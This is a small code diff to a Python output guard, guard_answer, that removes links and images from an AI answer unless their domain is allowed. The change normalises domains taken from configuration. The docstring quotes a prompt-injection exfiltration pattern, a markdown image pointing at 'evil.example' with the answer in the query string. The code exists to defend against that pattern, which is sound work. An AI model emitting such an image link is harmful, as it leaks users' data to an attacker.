@@ -94,6 +94,10 @@ def guard_answer(answer: str, allowed_domains: Sequence[str] = ()) -> tuple[str,
     instructions smuggle data out ("![](https://evil.example/?q=<the answer>)").
     """
     removed: list[str] = []
+    # Domains come from configuration ("a.example, B.example" in an environment variable), while
+    # urlparse gives a lower case hostname with no dots around it. Compare like with like, or an
+    # allowed domain written with a space, a capital or a leading dot silently never matches.
+    allowed_domains = [d for d in (x.strip().strip(".").lower() for x in allowed_domains) if d]
 
     def drop(m: re.Match) -> str:
         removed.append(m.group(0))
